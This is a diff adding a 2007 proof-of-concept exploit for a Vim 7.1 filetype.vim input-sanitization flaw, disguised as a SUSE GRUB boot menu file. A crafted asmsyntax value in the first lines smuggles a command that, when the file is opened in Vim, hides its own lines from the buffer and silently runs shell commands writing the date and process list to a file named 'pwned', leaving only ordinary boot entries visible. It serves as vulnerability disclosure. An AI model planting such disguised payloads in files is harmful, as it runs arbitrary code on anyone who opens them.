@@ -1,0 +1,40 @@
+
+#! ^^^Blank line, so that the ``#'' command prints only a line number^^^
+#! asmsyntax=asm|so%  <-- Needs to be within the first five lines
+
+#! Vim 7.1 missing untrusted input sanitization in filetype.vim: exploit
+#!
+#! Copyright: Copyright 2007 Jan Minar <rdancer@gmail.com>
+#! License:   GPLv2
+#! Usage:     See the accompanying Makefile
+
+#! The grub manual says unrecognized commands are ignored -- commenting
+#! is not strictly necessary.
+#! #|sil 1,/CUT_HERE$/d|exe "sil! !date -R>pwned;ps f>>pwned"|redr|fini
+sil 1,/CUT_HERE$/d|exe "sil! !date -R>pwned;ps f>>pwned"|redr|fini
+
+# Modeline
+# vim: syntax=vim :
+
+# This has to be the very last line
+# CUT_HERE
+# Modified by YaST2. Last modification on Mon Jul 23 02:57:35 BST 2007
+default 2
+timeout 8
+
+###Don't change this comment - YaST2 identifier: Original name: linux###
+title SUSE Linux 10.1
+    root (hd0,4)
+    kernel /boot/vmlinuz root=/dev/hda5 resume=/dev/hda2  splash=silent showopts
+    initrd /boot/initrd
+
+###Don't change this comment - YaST2 identifier: Original name: failsafe###
+title Failsafe -- SUSE Linux 10.1
+    root (hd0,4)
+    kernel /boot/vmlinuz root=/dev/hda5 showopts ide=nodma apm=off acpi=off noresume nosmp noapic maxcpus=0 edd=off 3
+    initrd /boot/initrd
+
+title Kernel-2.6.18.2-34-default
+    root (hd0,4)
+    kernel /boot/vmlinuz-2.6.18.2-34-default root=/dev/hda5 resume=/dev/hda2  splash=silent showopts
+    initrd /boot/initrd-2.6.18.2-34-default
